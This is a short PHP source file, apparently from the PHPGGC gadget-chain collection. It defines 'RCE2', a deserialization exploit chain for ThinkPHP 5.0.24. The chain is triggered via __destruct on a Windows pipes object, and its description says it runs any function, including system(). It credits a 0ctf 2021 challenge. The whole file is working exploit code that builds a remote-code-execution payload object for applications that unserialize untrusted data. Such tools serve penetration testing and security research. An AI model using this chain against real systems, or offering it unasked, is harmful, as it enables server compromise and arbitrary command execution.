<?php

namespace GadgetChain\ThinkPHP;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.0.24';
    public static $vector = '__destruct';
    public static $author = 'kemmio';
    public static $information = '
        This chain can only execute any function including system().
	Shoutout to c014 the 0ctf 2021 challenge creator!
        See the full writeup for the chain at https://blog.hexens.io/
    ';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        return new \think\process\pipes\Windows($function, $parameter);
    }
}
